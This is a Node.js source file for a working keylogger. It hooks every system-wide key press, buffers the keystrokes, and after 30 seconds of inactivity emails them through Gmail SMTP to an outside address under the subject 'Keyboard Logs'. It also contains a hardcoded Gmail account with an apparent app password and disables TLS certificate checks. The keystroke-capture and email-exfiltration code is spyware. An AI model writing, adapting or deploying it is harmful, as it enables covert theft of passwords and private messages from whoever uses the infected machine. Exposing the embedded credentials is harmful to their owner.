const nodemailer = require('nodemailer');
const GlobalKeyboardListener = require('node-global-key-listener').GlobalKeyboardListener;

// Initialize an empty string to store the current output
let currentOutput = "";

// Variable to track the inactivity timeout
let inactivityTimeout;

// Function to update the output
function updateOutput(keyName) {
    const enclosedKey = keyName.match(/^[a-zA-Z]$/) ? keyName : `<${keyName}>`;
    
    currentOutput += enclosedKey + " ";

    // Clear the entire console
    process.stdout.write('\x1Bc');

    // Write the updated output without the trailing space
    process.stdout.write(currentOutput.trim());

    clearTimeout(inactivityTimeout);
    inactivityTimeout = setTimeout(() => {
        sendLogsByEmail(currentOutput);
        currentOutput = "";
    }, 30000);
}

// Configure nodemailer with SMTP transport
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587,
    secure: false,
    auth: {
        user: 'venndelossantos@gmail.com',
        pass: 'tmuv vogf ndzk asqa'
    },
    tls: {
        rejectUnauthorized: false
    }
});

// Function to send logs via email  
function sendLogsByEmail(logs) {
    const mailOptions = {
        from: 'venndelossantos@gmail.com',
        to: 'jogava@my.cspc.edu.ph',
        subject: 'Keyboard Logs',
        text: logs
    };

    transporter.sendMail(mailOptions, function(error, info){
        if (error) {
            console.error('Error sending email:', error);
        } else {
            console.log('Email sent:', info.response);
        }
    });
}

const v = new GlobalKeyboardListener();
const keyState = {}; // Track the state of keys

// Add a listener to log every key press, but prevent double printing
v.addListener(function (e) {
    const keyName = e.name;
    if (!keyState[keyName]) {
        updateOutput(keyName); // Update the output
        keyState[keyName] = true;
    }
});

// Add a listener to reset the state when a key is released
v.addListener(function (e, down) {
    const keyName = e.name;
    if (!down[keyName]) {
        keyState[keyName] = false;
    }
});

// Capture Windows + Space on Windows and Command + Space on Mac
v.addListener(function (e, down) {
    if (e.name == "SPACE" && (down["LEFT META"] || down["RIGHT META"])) {
        // Call your function
        return true;
    }
});

// Capture ALT + F
v.addListener(function (e, down) {
    if (e.name == "F" && (down["LEFT ALT"] || down["RIGHT ALT"])) {
        // Call your function
        return true;
    }
});

// Add a listener that is only called once and demonstrate how to remove it
calledOnce = function (e) {
    console.log("only called once");
    v.removeListener(calledOnce);
};
v.addListener(calledOnce);